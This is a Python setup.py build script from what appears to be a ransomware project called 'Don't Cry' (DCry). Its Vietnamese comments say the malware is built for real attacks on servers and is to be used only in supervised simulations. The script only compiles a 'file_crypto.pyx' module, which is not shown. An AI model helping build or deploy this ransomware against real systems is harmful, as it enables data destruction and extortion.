################################################################################
#                             Don't Cry Ransomware                             #
#                          ! EDUCATIONAL PURPOSES ONLY !                       #
################################################################################
# Lưu ý: đây là mã độc DCry, được phát triển để thực hiện một cuộc tấn công thực thụ vào một hệ thống máy chủ.
# Vì vậy, Mã độc này có thể gây ra thiệt hại nghiêm trọng cho hệ thống và dữ liệu của bạn.
# Nên hãy sử dụng mã này một cách cẩn thận và chỉ được sử dụng trong các cuộc tấn công mạng giả lập nâng cao dưới sự giám sát của ít nhất một chuyên gia về an ninh mạng.

from setuptools import setup
from Cython.Build import cythonize

setup(
    ext_modules=cythonize("file_crypto.pyx", compiler_directives={"language_level": "3"})
)
